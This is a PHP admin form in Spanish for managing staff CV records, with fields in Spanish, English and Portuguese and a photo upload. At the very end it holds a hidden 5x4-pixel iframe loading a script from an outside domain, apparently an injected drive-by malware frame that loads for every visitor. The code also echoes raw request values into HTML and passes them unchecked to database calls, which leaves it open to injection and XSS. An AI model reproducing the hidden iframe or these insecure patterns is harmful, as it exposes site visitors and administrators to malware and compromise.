<?
	// <!-- BAJA DE REGISTRO EN LA BASE -->

	if ($_GET["action"]=="delete") {
		
		$Sql_result = $ManCur->DeleteCurriculum($_GET["id"]);

		if (!$Sql_result){
			echo "No pudo eliminar el registro";
		} 

		$SqlSrv->dbDisconnect();

		header ("location: curriculums.php");
		exit();

	}

	// <!-- ALTA O EDICION DE REGISTRO EN LA BASE -->

	if (isset($_POST["save"])) {
		
		$error = "";
		
		if (!$_POST["nombre"])		$error .= "• Nombre<br>";
		if (!$_POST["email"])		$error .= "• Email<br>";
		if (!$_POST["pais"])		$error .= "• Pais<br>";
			
		if (!$error){

			if (!isset($_POST["id"])){
				// - ALTA
				$Sql_result = $ManCur->AddCurriculum($_POST["nombre"], $_POST["email"], $_POST["pais"], $_POST["cargo_esp"], $_POST["cargo_ing"], $_POST["cargo_por"], $_POST["admisiones_esp"], $_POST["admisiones_ing"], $_POST["admisiones_por"], $_POST["experiencia_esp"], $_POST["experiencia_ing"], $_POST["experiencia_por"], $_POST["educacion_esp"], $_POST["educacion_ing"], $_POST["educacion_por"], $_POST["orden"]);

				$add_id = mysql_insert_id();
			} else {
				// - EDICION
				$Sql_result = $ManCur->EditCurriculum($_POST["nombre"], $_POST["email"], $_POST["pais"], $_POST["cargo_esp"], $_POST["cargo_ing"], $_POST["cargo_por"], $_POST["admisiones_esp"], $_POST["admisiones_ing"], $_POST["admisiones_por"], $_POST["experiencia_esp"], $_POST["experiencia_ing"], $_POST["experiencia_por"], $_POST["educacion_esp"], $_POST["educacion_ing"], $_POST["educacion_por"], $_POST["orden"], $_POST["id"]);

				$add_id = $_POST["id"];
			}
			
			if (!$Sql_result){
				echo "No pudo guardar el registro";
			} else {
				// --------- SUBO IMAGEN --------- //
				$campos[] = "id";
				$variables[] = $add_id;

				if (isset($_FILES['foto']) && $_FILES['foto']['tmp_name']!=''){
					$nombre_imagen = "curr_".$add_id;

					$Imagen = $ManImg->UploadImage($_FILES['foto']['tmp_name'], $imagePathCurr, $nombre_imagen, $_FILES['foto']['type']);

					$campos[] = "foto";
					$variables[] = $Imagen;
				}

				if (count($campos)>1){
					$EditTable = $ManImg->EditTable("equipo", $campos, $variables);
				}
				
				// --------- BORRAR IMAGEN --------- //
				$campos_del[0] = "id";
				$variables_del[0] = $add_id;

				if (isset($borrar_foto) && $borrar_foto=='1'){
					$campos_del[] = "foto";
					$variables_del[] = "";
				}

				if (count($campos_del)>1){
					$EditTable = $ManImg->EditTable("equipo", $campos_del, $variables_del);
				}

			}

			$SqlSrv->dbDisconnect();

			header ("location: curriculums.php");
			exit();
		
		}

	}
?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<TITLE> .:: TBX | Admin ::. </TITLE>

<!-- STYLES -->
<link rel=stylesheet type="text/css" href="../styles/styles.css">

</HEAD>

<BODY>

<?
	if (isset($_GET["id"])){
		$Sql_result = $ManCur->GetCurriculum($_GET["id"]);
			
		$row = mysql_fetch_array($Sql_result);

		$id					= $row['id'];
		$nombre				= $row['nombre'];
		$email				= $row['email'];
		$pais				= $row['pais'];
		$cargo_esp			= $row['cargo_esp'];
		$cargo_ing			= $row['cargo_ing'];
		$cargo_por			= $row['cargo_por'];
		$admisiones_esp		= $row['admisiones_esp'];
		$admisiones_ing		= $row['admisiones_ing'];
		$admisiones_por		= $row['admisiones_por'];
		$experiencia_esp	= $row['experiencia_esp'];
		$experiencia_ing	= $row['experiencia_ing'];
		$experiencia_por	= $row['experiencia_por'];
		$educacion_esp		= $row['educacion_esp'];
		$educacion_ing		= $row['educacion_ing'];
		$educacion_por		= $row['educacion_por'];
		$foto				= $row['foto'];
		$orden				= $row['orden'];
	} else {
		$pais	= $_POST["pais"];
		$orden	= $_POST["orden"];
	}
?>

			<!-- LISTADO -->
			<table cellpadding=0 cellspacing=0 border=0 class="marco_blanco">
				<tr> 
					<td>
					<!-- EDITAR SECCIONES -->
					<table cellpadding=2 cellspacing=0 border=0 width="100%">
						<tr> 
							<td><div class="sep"><spacer type=block width=1 height=1></div></td>
							</tr>
						<tr>
							<td class="txt"><img src="../img/fl.gif" width="5" height="9" hspace="5">Complete el siguiente formulario. Los campos señalados con<img src="../img/fl.gif" width="5" height="9" hspace="5"> son obligatorios</td>
						</tr>
						<tr> 
							<td><div class="sep"><spacer type=block width=1 height=1></div></td>
						</tr>
					</table>
					<br>
					<table cellpadding=2 cellspacing=0 border=0 width=100%>
					<form method="post" action="<?=$_SERVER['PHP_SELF']?>?action=edit" name="forma" enctype='multipart/form-data'>
					<?
					if (isset($_GET["id"])) {
						echo "<input type=hidden name=id value=\"$id\">";
					}
					?>
					<? if ($error){ ?>
						<tr> 
							<td colspan="2" class="txt" align="center"><span class="error">Complete correctamente los siguientes campos:</span><br><br>
							<span class="error"><?=$error?></span><br></td>
						</tr>
					<? } ?>
						<tr>
							<td class="txt" align=right><img src="../img/fl.gif" width="5" height="9" hspace="5">Nombre</td>
							<td><input type=text name="nombre" maxlength="50" class="form1" size="50" value="<?=$_POST["nombre"] ? $_POST["nombre"] : $nombre?>"></td>
						</tr>
						<tr>
							<td class="txt" align=right><img src="../img/fl.gif" width="5" height="9" hspace="5">Email</td>
							<td><input type=text name="email" maxlength="50" class="form1" size="50" value="<?=$_POST["email"] ? $_POST["email"] : $email?>"></td>
						</tr>
						<tr>
							<td class="txt" align=right><img src="../img/fl.gif" width="5" height="9" hspace="5">Pais</td>
							<td><select name="pais" class="form1">
								<option value="Argentina" <?if ($pais=="Argentina")echo "selected";?>>Argentina
								<option value="Brasil" <?if ($pais=="Brasil")echo "selected";?>>Brasil
								<option value="Chile" <?if ($pais=="Chile")echo "selected";?>>Chile
							</select></td>
						</tr>
						<tr>
							<td class="txt" align=right>Orden</td>
							<td><select name="orden" class="form1">
								<?
									for ($i=1; $i<101; $i++) {
										echo "<option value=\"$i\"";
										if ($orden==$i)echo " selected";
										echo ">$i";
									}
								?>
								
							</select></td>
						</tr>
						<tr>
							<td class="txt" align=right><B>Cargo</B></td>
							<td>&nbsp;</td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Español)</td>
							<td><input type=text name="cargo_esp" maxlength="50" class="form1" size="50" value="<?=$_POST["cargo_esp"] ? $_POST["cargo_esp"] : $cargo_esp?>"></td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Ingles)</td>
							<td><input type=text name="cargo_ing" maxlength="50" class="form1" size="50" value="<?=$_POST["cargo_ing"] ? $_POST["cargo_ing"] : $cargo_ing?>"></td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Portugues)</td>
							<td><input type=text name="cargo_por" maxlength="50" class="form1" size="50" value="<?=$_POST["cargo_por"] ? $_POST["cargo_por"] : $cargo_por?>"></td>
						</tr>
						<tr>
							<td class="txt" align=right><B>Admisiones</B></td>
							<td>&nbsp;</td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Español)</td>
							<td><input type=text name="admisiones_esp" maxlength="50" class="form1" size="50" value="<?=$_POST["admisiones_esp"] ? $_POST["admisiones_esp"] : $admisiones_esp?>"></td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Ingles)</td>
							<td><input type=text name="admisiones_ing" maxlength="50" class="form1" size="50" value="<?=$_POST["admisiones_ing"] ? $_POST["admisiones_ing"] : $admisiones_ing?>"></td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Portugues)</td>
							<td><input type=text name="admisiones_por" maxlength="50" class="form1" size="50" value="<?=$_POST["admisiones_por"] ? $_POST["admisiones_por"] : $admisiones_por?>"></td>
						</tr>
						<tr>
							<td class="txt" align=right><B>Experiencia</B></td>
							<td>&nbsp;</td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Español)</td>
							<td><textarea name="experiencia_esp" class="area1"><?=$_POST["experiencia_esp"] ? $_POST["experiencia_esp"] : $experiencia_esp?></textarea></td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Ingles)</td>
							<td><textarea name="experiencia_ing" class="area1"><?=$_POST["experiencia_ing"] ? $_POST["experiencia_ing"] : $experiencia_ing?></textarea></td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Portugues)</td>
							<td><textarea name="experiencia_por" class="area1"><?=$_POST["experiencia_por"] ? $_POST["experiencia_por"] : $experiencia_por?></textarea></td>
						</tr>
						<tr>
							<td class="txt" align=right><B>Educación</B></td>
							<td>&nbsp;</td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Español)</td>
							<td><textarea name="educacion_esp" class="area1"><?=$_POST["educacion_esp"] ? $_POST["educacion_esp"] : $educacion_esp?></textarea></td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Ingles)</td>
							<td><textarea name="educacion_ing" class="area1"><?=$_POST["educacion_ing"] ? $_POST["educacion_ing"] : $educacion_ing?></textarea></td>
						</tr>
						<tr>
							<td class="txt" align=right valign="top">(Portugues)</td>
							<td><textarea name="educacion_por" class="area1"><?=$_POST["educacion_por"] ? $_POST["educacion_por"] : $educacion_por?></textarea></td>
						</tr>
						<tr>
							<td class="txt" align=right>Foto (47x66)</td>
							<td><input type="file" name="foto" class="form1"></td>
						</tr>
						<? if ($foto){ ?>
						<tr>
							<td class="txt" align=right>&nbsp;</td>
							<td class="txt"><img src="<?=$imagePathCurr?><?=$foto?>" border="0"><br>
							<input type="checkbox" name="borrar_foto" value="1"> Borrar foto</td>
						</tr>
						<? } ?>
						<tr>
							<td align=right class=txt>&nbsp;</td>
							<td><INPUT TYPE="submit" value="Guardar" class="actionButton">&nbsp;&nbsp;<input type="button" onclick="self.location='curriculums.php';" value="Cancelar" class="actionButton"></td>
						</tr>
						<input type="hidden" name="save" value="1">
					</form>
					</table>
					<?
						$SqlSrv->dbDisconnect();
					?>
					</td>
				</tr>
			</table>
			

<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>
